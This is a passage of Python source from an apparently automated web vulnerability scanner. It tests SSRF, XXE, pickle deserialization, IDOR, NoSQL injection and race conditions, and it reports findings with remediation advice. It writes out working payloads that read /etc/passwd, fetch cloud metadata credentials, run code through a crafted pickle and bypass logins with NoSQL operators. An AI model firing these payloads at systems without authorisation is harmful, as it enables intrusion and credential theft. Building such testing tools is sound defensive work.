    # the gating looks similar: open redirect proves the CLIENT's browser
    # gets sent somewhere attacker-controlled; SSRF proves the SERVER
    # ITSELF makes a network request to an attacker-chosen target — image
    # proxies, "fetch remote document" features, webhook validators, and
    # avatar-by-URL uploads are all real, common instances of this
    # pattern. Two independent, zero-false-positive-risk signals, mirroring
    # the certainty this file already uses for path traversal (a literal
    # /etc/passwd content match) and the exposed-Kubernetes check (a real
    # JSON-shape content match) rather than a fuzzier timing/differential
    # lead — blind SSRF without an out-of-band callback genuinely can't be
    # proven with full confidence from outside, so this only ever reports
    # what it can prove directly from response content.
    if _SSRF_PARAM_RE.search(pname):
        ssrf_confirmed = False

        # 11a. file:// scheme — many real-world URL-fetchers are built on
        # a client (raw urllib, PHP cURL with default settings, Java's
        # URLConnection) that happily honors file:// alongside http(s)://
        # unless the scheme is explicitly restricted — a completely
        # different code path from step 6's path-traversal check (which
        # only ever mutates FILE-shaped parameters, never URL-shaped
        # ones), so a URL-fetch feature with this bug is otherwise
        # invisible to every other check in this file.
        for file_payload in ("file:///etc/passwd", "file:///etc/passwd%00.png"):
            if budget.exhausted():
                return
            url_f = _build_url(parts, _with_param(pairs, pname, file_payload))
            resp_f = _polite_get(budget, delay, url_f, timeout)
            if resp_f is not None and re.search(r"root:.*:0:0:", resp_f.text or ""):
                ssrf_confirmed = True
                _persist(
                    ctx,
                    title=f"Server-Side Request Forgery (file:// local file read) via '{pname}' parameter",
                    severity="critical",
                    category="Server-Side Request Forgery",
                    url=url_f, param=pname, payload=file_payload,
                    description=(
                        f"Setting '{pname}' to a file:// URL caused the server's own URL-fetch "
                        f"logic to read and return local filesystem content — /etc/passwd "
                        f"content (matching the root:...:0:0: signature) came back in the live "
                        f"response, confirmed by direct content matching. This is a server-side "
                        f"bug, not a client-side one: the server itself performed the file read, "
                        f"on an attacker-chosen scheme and path."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(resp_f.text or "", "root:"),
                    impact=("Arbitrary local file read via the server's own fetch logic — often "
                           "reaches credentials, source code, or configuration files, frequently "
                           "escalating well beyond a single parameter's intended function."),
                    remediation=("Restrict the URL-fetch client to http(s):// only, explicitly "
                                "reject file:// (and gopher://, dict://, etc.), and validate the "
                                "resolved target isn't a local/internal address before fetching."),
                )
                break

        if budget.exhausted():
            return

        # 11b. Cloud-metadata-shaped fetch — the single most damaging real
        # SSRF outcome: a server that will fetch an attacker-chosen URL
        # and return the result usually also fetches
        # http://169.254.169.254/ (AWS/most clouds' link-local
        # instance-metadata address) or GCP's metadata.google.internal,
        # both of which hand back IAM credentials / instance identity
        # with zero authentication to anything that can reach them — the
        # SSRF-to-cloud-credential-theft chain behind some of the
        # highest-severity SSRF disclosures in bug bounty history.
        # Reported only on a genuine metadata-shaped CONTENT match (same
        # certainty tier as the exposed-Kubernetes-API check's real
        # JSON-shape validation), not merely "the request didn't error."
        if not ssrf_confirmed:
            for meta_payload in _SSRF_METADATA_URLS:
                if budget.exhausted():
                    return
                url_m = _build_url(parts, _with_param(pairs, pname, meta_payload))
                resp_m = _polite_get(budget, delay, url_m, timeout)
                body_m = resp_m.text or "" if resp_m is not None else None
                match_m = _SSRF_METADATA_LEAK_RE.search(body_m) if body_m is not None else None
                # Unlike the file:// tier's root:.*:0:0: signature above (specific
                # enough that a baseline coincidence is negligible — the same
                # signature path traversal's own check already trusts without a
                # baseline check), terms like "instance-id"/"ami-id" are plausible
                # on an entirely unrelated real page (a cloud-management dashboard,
                # a DevOps blog post) — self-caught on review, not found live: the
                # matched signature must be genuinely NEW relative to baseline, the
                # same "present in mutated, absent from baseline" discipline every
                # reflection-based check in this file already uses.
                if match_m and match_m.group(0).lower() not in baseline["body"].lower():
                    _persist(
                        ctx,
                        title=f"Server-Side Request Forgery (cloud metadata access) via '{pname}' parameter",
                        severity="critical",
                        category="Server-Side Request Forgery",
                        url=url_m, param=pname, payload=meta_payload,
                        description=(
                            f"Setting '{pname}' to a cloud instance-metadata URL "
                            f"({meta_payload}) caused the server's own URL-fetch logic to reach "
                            f"it and return real metadata content in the live response — "
                            f"confirmed by matching known AWS/GCP instance-metadata content "
                            f"signatures (instance/AMI identifiers, IAM credential-listing "
                            f"paths, or compute-metadata markers), not just an absence of "
                            f"errors."
                        ),
                        baseline_snippet=_ctx_snippet(baseline["body"], ""),
                        mutated_snippet=_ctx_snippet(body_m, match_m.group(0), maxlen=500),
                        impact=("Cloud instance metadata frequently hands back temporary IAM "
                               "credentials with zero authentication to anything that can reach "
                               "the link-local address — a common path from a single "
                               "vulnerable URL-fetch parameter to full cloud-account "
                               "compromise."),
                        remediation=("Block outbound requests to 169.254.169.254 and other "
                                    "well-known metadata addresses at the network/egress-"
                                    "filtering layer, require IMDSv2-style token-gated metadata "
                                    "access where the cloud provider supports it, and never let "
                                    "a user-controlled URL reach the fetch client unvalidated."),
                    )
                    break

    if budget.exhausted():
        return

    # --- 12. XXE (only params whose ORIGINAL value already looks like XML) ---
    # Fits the existing GET-only per-parameter architecture with no new
    # request capability at all — gated on the parameter's OWN baseline
    # value already looking like XML (a leading `<?xml` or opening tag),
    # rather than trying it on every parameter, since that's real evidence
    # the endpoint already accepts and parses XML content through this
    # exact parameter, the same "only test what the target already
    # demonstrated it does" discipline the SSRF metadata check above uses.
    # A completely different, and genuinely more common in practice than
    # it sounds, surface than a POST-body XML upload: SOAP-over-GET,
    # XML-in-query-param config/preview validators, and legacy
    # XML-RPC-style endpoints are real, if less common than POST-based
    # XXE. Same zero-ambiguity /etc/passwd content signature the
    # path-traversal and SSRF file:// checks already use — no differential
    # or blind-XXE (out-of-band DTD, error-based data exfiltration via
    # external DTD) tier, since those need infrastructure (a listener the
    # operator controls) this tool doesn't have, matching the same
    # honest-gap-over-guess call already made for blind SSRF above.
    if _XML_SHAPED_RE.match(orig_value or ""):
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
            '<r>&x;</r>'
        )
        url_x = _build_url(parts, _with_param(pairs, pname, xxe_payload))
        resp_x = _polite_get(budget, delay, url_x, timeout)
        if resp_x is not None and re.search(r"root:.*:0:0:", resp_x.text or ""):
            _persist(
                ctx,
                title=f"XML External Entity (XXE) Injection via '{pname}' parameter",
                severity="critical",
                category="XML External Entity Injection",
                url=url_x, param=pname, payload=xxe_payload,
                description=(
                    f"'{pname}' already carried XML content in the baseline request, and "
                    f"submitting a DOCTYPE declaring an external entity pointing at "
                    f"file:///etc/passwd caused the server's XML parser to resolve it and "
                    f"return real local filesystem content — /etc/passwd content (matching "
                    f"the root:...:0:0: signature) came back in the live response, confirmed "
                    f"by direct content matching. The parser is resolving external entities "
                    f"from attacker-controlled DTD content, a common misconfiguration in "
                    f"XML libraries that don't disable this by default (unlike Python's own "
                    f"stdlib XML parsers, which structurally cannot do this at all — this is "
                    f"a library-choice/configuration bug, not a language-level gap)."
                ),
                baseline_snippet=_ctx_snippet(baseline["body"], ""),
                mutated_snippet=_ctx_snippet(resp_x.text or "", "root:"),
                impact=("Arbitrary local file read via the XML parser's own entity "
                       "resolution — frequently escalates to SSRF (an external entity's "
                       "SYSTEM identifier can be an http:// URL, not just file://, reaching "
                       "the same internal targets the SSRF check above does) or, on "
                       "vulnerable parser/library combinations, denial of service via "
                       "entity expansion (\"billion laughs\")."),
                remediation=("Disable external entity and DTD resolution entirely in the XML "
                            "parser configuration — for lxml specifically, never set "
                            "resolve_entities=True; for other libraries, look for the "
                            "equivalent 'disable external entities' / 'disallow DOCTYPE' "
                            "setting and treat it as mandatory, not optional."),
            )

    if budget.exhausted():
        return

    # --- 13. Python pickle deserialization (only if the parameter's
    #     ORIGINAL value already decodes to a real pickle-protocol byte
    #     header — --depth deep only, needs a real timing side-channel) ---
    # Same "test only what the target already demonstrated it accepts"
    # discipline as XXE above, applied to a completely different format —
    # a parameter carrying base64-encoded pickle data is real evidence
    # this exact parameter round-trips through pickle.loads() somewhere
    # server-side (a "session state"/"cart"/"remember-me token" pattern
    # that's a genuine, if bad, real-world practice, not contrived).
    # Proves RCE the same way the time-based SQLi/cmdi checks above do —
    # a bounded sleep and a real statistical timing gate — because a
    # crafted pickle's __reduce__ genuinely executes an arbitrary
    # callable during unpickling if the target's unpickler doesn't
    # restrict which classes/functions it accepts (the entire
    # vulnerability), not because this tool assumes anything about what
    # RCE "should" look like.
    if ctx.depth == "deep":
        pickle_variant = _pickle_b64_variant(orig_value)
        if pickle_variant:
            pickle_payload = _pickle_sleep_payload_b64(4, pickle_variant)
            url_pk = _build_url(parts, _with_param(pairs, pname, pickle_payload))
            if not budget.exhausted():
                time.sleep(delay)
                budget.spend()
                try:
                    t0 = time.monotonic()
                    requests.get(url_pk, timeout=max(timeout, 9), allow_redirects=True,
                                headers=_UA_HEADERS)
                    elapsed = time.monotonic() - t0
                except requests.exceptions.Timeout:
                    console.print(f"  [dim]'{_rich_escape(pname)}': pickle deserialization "
                                 f"probe timed out before completing — inconclusive, "
                                 f"skipping.[/dim]")
                    elapsed = None
                except Exception:
                    elapsed = None

                if elapsed is not None:
                    threshold = baseline["mean_time"] + max(3 * baseline["stdev_time"], 2.5)
                    if elapsed >= threshold:
                        _persist(
                            ctx,
                            title=f"Insecure Deserialization (Python pickle) via '{pname}' parameter",
                            severity="critical",
                            category="Insecure Deserialization",
                            url=url_pk, param=pname, payload=pickle_payload,
                            description=(
                                f"'{pname}' already carried base64-encoded data matching "
                                f"Python pickle's protocol-2+ byte header in the baseline "
                                f"request, and submitting a crafted pickle payload whose "
                                f"__reduce__ method calls os.system('sleep 4') caused the "
                                f"response to take {elapsed:.2f}s, versus a statistical "
                                f"baseline of {baseline['mean_time']:.2f}s ± "
                                f"{baseline['stdev_time']:.2f}s (3 samples). Gate used: "
                                f"baseline_mean + max(3×stdev, 2.5s) = {threshold:.2f}s. "
                                f"This proves the target's unpickler does not restrict "
                                f"which classes/callables it will reconstruct — the entire "
                                f"vulnerability — since a real callable genuinely executed "
                                f"during deserialization, not just data being parsed."
                            ),
                            baseline_snippet=f"baseline request times (s): {[round(t, 3) for t in baseline['times']]}",
                            mutated_snippet=f"mutated request elapsed: {elapsed:.2f}s (threshold {threshold:.2f}s)",
                            impact=("Full remote code execution — an unrestricted unpickler "
                                   "will reconstruct and call ANY importable callable an "
                                   "attacker names, not just run a harmless sleep; this is "
                                   "one of the most severe vulnerability classes that exists."),
                            remediation=("Never unpickle data from an untrusted source. Use a "
                                        "safe serialization format (JSON) for anything that "
                                        "crosses a trust boundary; if pickle is unavoidable "
                                        "for internal use, sign and verify the payload before "
                                        "ever calling pickle.loads() on it."),
                            custom_poc_script=_gen_timing_poc(
                                url_pk, "Insecure Deserialization (Python pickle)", threshold,
                            ),
                        )


# ---------------------------------------------------------------------------
# IDOR heuristic (runs once per target, on the PATH not the query string)
# ---------------------------------------------------------------------------
#
# v1 of this heuristic used a single whole-body difflib similarity band
# (0.3-0.85) to distinguish "a genuine second record" from "an error/
# not-found page". That missed the single most common real-world IDOR
# shape: a well-built app's profile/order/invoice page, where a different
# ID returns the SAME template with only a few fields swapped (username,
# email, order total, ...) — which measures well above 0.85 similarity
# (a real practice-range profile page measured 0.976) and was silently
# excluded. v2 below removes the upper bound and instead inspects the
# ACTUAL differing content (via SequenceMatcher.get_opcodes()) to decide
# whether the change looks like real per-record data or just noise
# (timestamps/CSRF tokens/session IDs) or an access-denied page that
# happened to return 200 — both of which would otherwise become false
# positives once the upper bound is gone.
# ---------------------------------------------------------------------------

# Matched against the ~40 chars of BASELINE text immediately preceding a
# changed span — catches "Session: <changed>", "Loaded at <changed>" style
# noise even when the changed value itself (a bare timestamp fragment or
# session id) doesn't self-identify as noise once diffed out of context.
_IDOR_NOISE_LABEL_RE = re.compile(
    r"csrf|nonce|\btoken\b|timestamp|\bsession\b|request[_-]?id|"
    r"loaded at|generated at|expires|last[_-]?updated|\bnow\b",
    re.I,
)
# A changed chunk that itself looks like a random token/hash/session id,
# independent of any surrounding label — belt-and-suspenders for the
# context check above (e.g. a token embedded with no descriptive label).
_IDOR_RANDOM_TOKEN_RE = re.compile(r"^(?:[0-9a-f]{12,}|[A-Za-z0-9_-]{20,})$")
_DENIAL_PHRASE_RE = re.compile(
    r"access denied|not authorized|unauthoriz|forbidden|please log ?in|"
    r"permission denied|401 unauthorized|403 forbidden|sign in to continue|"
    r"you (?:must|need to) (?:log|sign) in",
    re.I,
)  # shared by the IDOR heuristic and NoSQL injection testing below — both need
   # to rule out "the request was simply rejected" before treating a response
   # diff as a real signal

# NoSQLi login-bypass responses often swap a SHORT "denied" message for a
# SHORT "success" message — a small raw length delta despite being a
# completely different, security-critical outcome (confirmed directly
# against testlab's own /login: 21 bytes of difference, well under any
# reasonable generic length-diff threshold). Rather than tune the generic
# threshold down (and risk noise on every other check that shares it), this
# gives NoSQL injection testing its own, more targeted signal: did a
# recognizably failure-shaped response become non-failure-shaped.
_FAILURE_INDICATOR_RE = re.compile(
    r"invalid|incorrect|failed|unsuccessful|denied|no match|"
    r"wrong (?:username|password|credentials)|"
    r"too many (?:attempts|tries|requests)|account (?:locked|suspended)|"
    r"temporarily (?:locked|disabled|suspended|blocked)|try again later|"
    r"rate limit",
    re.I,
)  # the lockout/rate-limit phrasing matters specifically for
   # _test_default_credentials: that check fires up to 8 sequential login
   # attempts against the same username, and a target that locks the
   # account partway through and returns 200 with lockout wording matching
   # NEITHER this regex nor _DENIAL_PHRASE_RE would otherwise read as
   # "baseline looked like failure, this response doesn't" — a false
   # CRITICAL "default credentials accepted" caused entirely by the
   # check's own repeated guessing, not a real successful login.


def _nosqli_signal(baseline_body, mutated_body, status_changed, len_changed):
    """True if either a semantic failure->non-failure flip is observed, or
    the existing generic status/length diff fires — the semantic check is
    the primary signal for this vuln class; the generic diff is a fallback
    for endpoints (e.g. a search/filter) that don't use recognizable
    pass/fail wording at all."""
    baseline_failed = bool(_FAILURE_INDICATOR_RE.search(baseline_body))
    mutated_failed = bool(_FAILURE_INDICATOR_RE.search(mutated_body))
    semantic_signal = baseline_failed and not mutated_failed
    return semantic_signal or status_changed or len_changed


def _nosqli_control_confirms(ctx, control_url, baseline):
    """Both NoSQLi checks rename a parameter's key to bracket notation
    (pname[$op]) — for a target that does NOT do bracket-notation query
    parsing (the vast majority; only Express's `qs`, some PHP setups, and
    similar do), that rename has an unrelated but very real side effect:
    the ORIGINAL key vanishes entirely, and simply dropping any parameter
    can independently change behavior for reasons that have nothing to do
    with NoSQL operators (confirmed directly against this project's own
    testlab: /product, /doc, and /go all initially false-positived here,
    purely because losing their one real parameter changed their output —
    not because any operator was interpreted).

    This sends a CONTROL request with the parameter(s) simply removed
    (not bracket-renamed, just absent) and returns True only if that
    control does NOT show the same apparent signal the operator payload
    did — i.e., the operator's effect is genuinely distinct from "this
    parameter went missing," not just an artifact of the rename itself."""
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
    if budget.exhausted():
        return False  # can't verify — be conservative, treat as unproven
    resp_c = _polite_get(budget, delay, control_url, timeout)
    if resp_c is None:
        return False
    control_body = resp_c.text or ""
    control_status_changed = resp_c.status_code != baseline["status"]
    control_len_changed = abs(len(control_body) - baseline["length"]) > max(
        60, baseline["length"] * 0.08)
    control_also_signals = _nosqli_signal(baseline["body"], control_body,
                                          control_status_changed, control_len_changed)
    return not control_also_signals


def _idor_diff_signal(baseline_body, mutated_body):
    """Decide whether a mutated-ID response differs from the baseline in a
    way that looks like a genuine different record, at ANY similarity level
    (not just a mid-range band) — returns (is_signal, ratio, changed_sample).

    Two failure modes to guard against now that there's no upper bound:
      1. High similarity (same template, swapped data) — real IDOR, must
         still be caught. Guarded by requiring the actual differing text to
         be non-trivial, and by filtering out any differing span that sits
         right after a known noise-field label in the BASELINE (context,
         not just the changed text itself — a bare "xyz999" or "14:31:05"
         fragment doesn't self-identify as a session id or timestamp once
         diffed out of its "Session: "/"Loaded at " context) or that looks
         like a random token/hash on its own.
      2. An access-denied/login-wall page that happens to return 200 with
         very different content from the baseline — NOT a real record,
         would be a false positive under a loosened lower bound too.
         Guarded by an explicit denial-phrase check.
    """
    baseline_body = baseline_body or ""
    mutated_body = mutated_body or ""
    if not mutated_body or mutated_body == baseline_body:
        return False, 1.0 if mutated_body == baseline_body else 0.0, ""

    sm = difflib.SequenceMatcher(None, baseline_body, mutated_body)
    ratio = sm.ratio()
    if ratio < 0.3:
        return False, ratio, ""  # too different — likely an error/redirect page, not a sibling record

    if _DENIAL_PHRASE_RE.search(mutated_body):
        return False, ratio, ""

    real_chunks = []
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag not in ("replace", "insert"):
            continue
        chunk = mutated_body[j1:j2].strip()
        if not chunk:
            continue
        context_before = baseline_body[max(0, i1 - 40):i1]
        if _IDOR_NOISE_LABEL_RE.search(context_before):
            continue  # sits right after a known noise-field label — skip
        if _IDOR_RANDOM_TOKEN_RE.match(chunk):
            continue  # looks like a random token/session id/hash on its own
        real_chunks.append(chunk)

    changed_text = " ".join(real_chunks)
    meaningful = re.sub(r"[\s\W_]+", "", changed_text)
    if len(meaningful) < 3:
        return False, ratio, changed_text  # trivial, or every real diff was filtered as noise

    return True, ratio, changed_text[:300]


_UUID_RE = re.compile(
    r"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", re.I
)


def _detect_path_id(path):
    """Find the first ID-shaped path segment and classify it. Checked in
    specificity order — a UUID also happens to satisfy the looser hashid
    pattern below, so it must be tried first. Returns (match, kind) with
    kind in {"numeric", "uuid", "hashid"}, or (None, None)."""
    m = re.search(r"/(\d+)(?:/|$)", path)
    if m:
        return m, "numeric"
    m = _UUID_RE.search(path)
    if m:
        return m, "uuid"
    # Opaque-ID heuristic (Hashids-style output, base62 tokens, etc.): a
    # full path SEGMENT, alnum/dash/underscore, 6-24 chars, with at least
    # one digit AND one letter so ordinary path words ("products",
    # "profile") don't false-match.
    for seg in re.finditer(r"/([A-Za-z0-9_-]{6,24})(?:/|$)", path):
        val = seg.group(1)
        if any(c.isdigit() for c in val) and any(c.isalpha() for c in val):
            return seg, "hashid"
    return None, None


def _find_sibling_ids(ctx, parts, id_start, id_end, orig_id):
    """For UUID/hashid-shaped IDs, blindly guessing a neighbor is futile —
    a UUIDv4 is 122 bits of randomness, there is no "id + 1000". Instead,
    cross-reference OTHER URLs already discovered in this engagement's own
    recon data (wayback_urls / urls) that share the exact same path
    template (identical prefix/suffix, only the ID position differs).
    Testing a real ID a crawl already found is far more likely to hit a
    genuine record than any generated guess."""
    prefix, suffix = parts.path[:id_start], parts.path[id_end:]
    template_re = re.compile(r"^" + re.escape(prefix) + r"([^/]+)" + re.escape(suffix) + r"$")

    candidates = []
    seen = set()
    for dtype in ("wayback_urls", "urls"):
        try:
            entries = _get_latest_recon(ctx.eng_id, dtype, limit=1)
        except Exception:
            entries = []
        for entry in entries:
            for line in (entry.get("content") or "").splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    other = urlsplit(line)
                except ValueError:
                    continue
                if other.netloc != parts.netloc:
                    continue
                mm = template_re.match(other.path)
                if mm and mm.group(1) != orig_id and mm.group(1) not in seen:
                    seen.add(mm.group(1))
                    candidates.append(mm.group(1))
                    if len(candidates) >= 5:  # bounded — don't test unlimited siblings
                        return candidates
    return candidates


def _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
    """Request one alternate-ID URL (already built by the caller — path
    substitution differs slightly between the numeric and UUID/hashid
    cases), diff it against the baseline, and persist a finding if it
    signals a real IDOR. Shared by both callers below; only the
    description's framing of *how the alternate ID was obtained*
    (source_note) differs between them. Returns True if a finding was
    persisted (caller stops after the first hit — one lead is enough)."""
    resp = _polite_get(ctx.budget, ctx.delay, new_url, ctx.timeout)
    if resp is None or resp.status_code != 200:
        return False

    is_signal, ratio, changed_sample = _idor_diff_signal(baseline["body"], resp.text or "")
    if not is_signal:
        return False

    same_template = ratio > 0.85
    ai_result = None
    if ctx.ai_enabled:
        ai_result = _ai_escalate(ctx, "IDOR (heuristic)", "path-id", new_url, variant,
                                 baseline["body"], resp.text or "")
    reasoning = ai_result.get("reasoning") if ai_result else None

    shape_desc = (
        f"using what looks like the SAME page template as the baseline (similarity ratio "
        f"{ratio:.2f}) but with genuinely different content in place — e.g. "
        f"\"{changed_sample[:150]}\" — consistent with a different underlying record (a "
        f"different user/order/record's data) being returned rather than an access-denied "
        f"page. This is the most common real-world IDOR shape: a well-built page's template "
        f"stays identical, only the record's own fields change."
        if same_template else
        f"with meaningfully different content from the baseline (similarity ratio {ratio:.2f}) "
        f"rather than an error/not-found page — e.g. \"{changed_sample[:150]}\"."
    )

    _persist(
        ctx,
        title=(f"Potential IDOR (heuristic) on path ID {orig_id_str} — confirm manually "
              f"with two distinct authenticated sessions"),
        severity="medium",
        category="Insecure Direct Object Reference (heuristic)",
        url=new_url, param="path-id", payload=variant,
        description=(
            f"{source_note} A 200 OK response was returned {shape_desc} This is an "
            "intentionally single-session heuristic — HAKUZA v1 cannot yet drive two distinct "
            "authenticated sessions, so this is a LEAD, not a confirmed IDOR. Confirm manually "
            "with two distinct authenticated user sessions before reporting this as a finding."
        ),
        baseline_snippet=_ctx_snippet(baseline["body"], ""),
        mutated_snippet=_ctx_snippet(resp.text or "", ""),
        impact=("If confirmed with two authenticated sessions, this would allow horizontal "
               "privilege escalation — any authenticated user could access another user's "
               "records by supplying a different ID."),
        remediation=("Enforce object-level authorization checks server-side on every request "
                    "— verify the requesting session actually owns the requested resource; "
                    "never trust client-supplied IDs alone."),
        ai_reasoning=reasoning,
    )
    return True


# ---------------------------------------------------------------------------
# NoSQL injection — ALL parameters simultaneously (runs once per target)
# ---------------------------------------------------------------------------
#
# The per-parameter NoSQLi step inside _test_param (step 9) mutates one
# parameter at a time, keeping everything else at its original value — the
# right model for XSS/SQLi/SSTI/etc., where breaking one field is enough to
# observe a difference. It is the WRONG model for the classic NoSQLi
# login-bypass shape: a check like `username == X AND password == Y` stays
# fully enforced by whichever field is still a plain string, so injecting
# the operator into only one of two AND-ed fields produces no observable
# difference at all — confirmed directly against this project's own
# testlab/vulnerable_site.py /login endpoint, which requires both fields to
# carry an operator simultaneously before the bypass has any effect. Real
# NoSQLi testing always injects into every relevant field at once for
# exactly this reason, so this second pass does the same: swap every
# parameter's key to bracket-operator notation together and diff once.
# ---------------------------------------------------------------------------

def _test_nosqli_all_params(ctx, parts, pairs, baseline):
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout
    param_names = [k for k, _ in pairs]
    if len(param_names) < 2 or budget.exhausted():
        return  # single-param case is already covered by the per-param step

    for op, val in (("$ne", "hakuza_nosqli_probe"), ("$regex", ".*")):
        if budget.exhausted():
            return
        new_pairs = [(f"{k}[{op}]", val) for k in param_names]
        url_n = _build_url(parts, new_pairs)
        resp_n = _polite_get(budget, delay, url_n, timeout)
        if resp_n is None:
            continue
        body_n = resp_n.text or ""
        status_changed = resp_n.status_code != baseline["status"]
        len_changed = abs(len(body_n) - baseline["length"]) > max(60, baseline["length"] * 0.08)
        if _DENIAL_PHRASE_RE.search(body_n) or not _nosqli_signal(
                baseline["body"], body_n, status_changed, len_changed):
            continue

        control_url = _build_url(parts, [])  # all parameters simply absent, not bracket-renamed
        if not _nosqli_control_confirms(ctx, control_url, baseline):
            continue  # dropping every parameter looks the same — the operators proved nothing

        ai_result = None
        if ctx.ai_enabled:
            ai_result = _ai_escalate(ctx, "NoSQL Injection (all-parameter operator)",
                                     "all parameters", url_n,
                                     f"every param -> [{op}]={val}", baseline["body"], body_n)
        reasoning = ai_result.get("reasoning") if ai_result else None
        confirmed = ai_result is not None and ai_result.get("verdict") == "CONFIRMED"
        likely = ai_result is not None and ai_result.get("verdict") == "LIKELY"
        if ai_result is not None and not (confirmed or likely):
            continue

        title_suffix = "" if confirmed else " (needs manual confirmation)"
        _persist(
            ctx,
            title=f"Potential NoSQL Injection — all parameters (auth bypass shape){title_suffix}",
            severity="critical" if confirmed else "high",
            category="NoSQL Injection",
            url=url_n, param="all parameters", payload=f"every param -> [{op}]={val}",
            description=(
                f"Replacing EVERY query parameter's key with bracket-notation operator "
                f"notation ({op}) simultaneously — the classic NoSQLi auth-bypass pattern, "
                f"since an AND-conjunction check (e.g. username == X AND password == Y) "
                f"stays fully enforced unless every ANDed field is neutralized at once — "
                f"produced a meaningfully different response (status "
                f"{baseline['status']}→{resp_n.status_code}, length "
                f"{baseline['length']}→{len(body_n)}). Confirm the backend actually uses a "
                f"document database before treating this as confirmed."
            ),
            baseline_snippet=_ctx_snippet(baseline["body"], ""),
            mutated_snippet=_ctx_snippet(body_n, ""),
            impact=("If this endpoint is an authentication check, this is a full "
                   "authentication bypass — no valid credentials needed."),
            remediation=("Never pass parsed query-string/body objects directly into a "
                        "database query. Validate that expected fields are the expected "
                        "primitive type before using them in any query."),
            ai_reasoning=reasoning,
        )
        return


# ---------------------------------------------------------------------------
# Race conditions (runs once per target — a genuinely different testing
# model from everything else in this file: concurrent identical requests,
# not sequential baseline-vs-mutated diffing)
# ---------------------------------------------------------------------------

_RACE_ACTION_RE = re.compile(
    r"redeem|claim|apply|checkout|vote|coupon|voucher|consume|withdraw|"
    r"transfer|purchase|enroll|register|use[-_]?once|one[-_]?time",
    re.I,
)


def _gen_race_poc(url, n, success_count, denial_or_failure_marker_words):
    """A race condition CANNOT be reproduced by a single request — the
    generic single-shot gen_python_poc() would just show one successful
    redemption (assuming the resource is still available) and prove
    nothing about the race itself. This writes a dedicated, genuinely
    concurrent PoC using a real thread pool, so re-running it actually
    re-demonstrates the double-spend rather than misrepresenting what
    the finding is."""
    return f'''#!/usr/bin/env python3
# PoC: Race Condition reproduction
# Target: {url!r}
# Fires {n} identical requests at the same instant via a thread pool and
# counts how many come back as an unqualified success. Originally observed:
# {success_count}/{n} succeeded. A properly-fixed endpoint should show at
# most 1 success on every run of this script.
# Run: pip install requests && python3 <this file>

import sys
import concurrent.futures
import requests

URL = {url!r}
N = {n}
FAILURE_MARKERS = {denial_or_failure_marker_words!r}


def fire():
    try:
        r = requests.get(URL, timeout=15)
        return r.status_code, r.text
    except requests.RequestException as exc:
        return None, str(exc)


def looks_like_success(status, body):
    if status != 200:
        return False
    lower = (body or "").lower()
    return not any(marker in lower for marker in FAILURE_MARKERS)


def main() -> int:
    with concurrent.futures.ThreadPoolExecutor(max_workers=N) as pool:
        results = list(pool.map(lambda _: fire(), range(N)))

    successes = sum(1 for status, body in results if looks_like_success(status, body))
    print(f"{{successes}}/{{N}} concurrent requests returned an unqualified success")

    if successes >= 2:
        print("[PASS] Race condition reproduced — multiple concurrent requests succeeded")
        return 0
    print("[FAIL] Only 0-1 succeeded this run — race window may be fixed, or narrower "
          "than this run happened to hit; try increasing N")
    return 1


if __name__ == "__main__":
    sys.exit(main())
'''


def _test_race_condition(ctx, target_url, baseline):
    """Only fires on URLs whose path/params look action-shaped (redeem,
    claim, checkout, ...) — a burst of N concurrent requests is a real cost
    (N requests all at once, no politeness delay by design, since delaying
    between them would defeat the entire point of testing for a race
    window), so it's gated to endpoints where a single-use/limited-resource
    bug is actually plausible rather than fired at every URL.

    Fires N identical requests at the same instant via a thread pool (not
    sequentially — sequential requests can't expose a race window at all)
    and counts how many come back looking like an unqualified success. For
    a correctly-implemented single-use action, exactly one concurrent
    request should win and the rest should see the "already used" outcome.
    Two or more successes is about as close to direct proof as a
    heuristic-based test gets — no ambiguity to escalate to AI about, this
    is a demonstrated double-spend, not a suggestive diff."""
    if not _RACE_ACTION_RE.search(target_url):
        return
    budget, timeout = ctx.budget, ctx.timeout
    n = 10
    if budget.count + n > budget.max_requests:
        ctx.console.print(
            f"  [dim]URL looks action-shaped but the remaining request budget "
            f"({budget.max_requests - budget.count}) is below the {n} needed for a "
            f"meaningful concurrent burst — skipping race-condition test.[/dim]"
        )
        return
    budget.spend(n)

    def _fire():
        try:
            return requests.get(target_url, timeout=timeout, headers=_UA_HEADERS)
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as pool:
        responses = list(pool.map(lambda _: _fire(), range(n)))

    successes = [
        r for r in responses
        if r is not None and r.status_code == 200
        and not _DENIAL_PHRASE_RE.search(r.text or "")
        and not _FAILURE_INDICATOR_RE.search(r.text or "")
    ]
    failed_or_none = n - len(successes)

    if len(successes) >= 2:
        sample_bodies = "\n---\n".join(_ctx_snippet(r.text or "", "", maxlen=300)
                                       for r in successes[:3])
        _persist(
            ctx,
            title="Race Condition — single-use action processed multiple times concurrently",
            severity="high",
            category="Race Condition",
            url=target_url, param="(concurrent requests)", payload=f"{n}x simultaneous GET",
            description=(
                f"Fired {n} identical requests to this action-shaped URL at the same "
                f"instant via a thread pool (not sequentially). {len(successes)} of {n} "
                f"came back with an unqualified-success response ({failed_or_none} did "
                f"not) — for a correctly-guarded single-use/limited action, at most 1 "
                f"should ever succeed under concurrent load. This is a real double-spend "
                f"demonstration, not a suggestive diff: the same limited resource/action "
                f"was granted more than once in the same instant."
            ),
            baseline_snippet=_ctx_snippet(baseline["body"], ""),
            mutated_snippet=(f"{len(successes)}/{n} concurrent requests succeeded:\n"
                             f"{sample_bodies}"),
            impact=("Depending on the endpoint, this can mean a coupon/voucher redeemed "
                   "multiple times, a balance withdrawn or transferred more than once, "
                   "a vote or entry counted repeatedly, or a limited-stock item purchased "
                   "beyond available quantity — direct financial or business-logic impact."),
            remediation=("Serialize access to the shared resource with a database-level "
                        "lock or atomic compare-and-swap operation (e.g. an atomic "
                        "decrement with a WHERE balance > 0 guard), not a read-then-write "
                        "check performed in application code."),
            custom_poc_script=_gen_race_poc(
                target_url, n, len(successes),
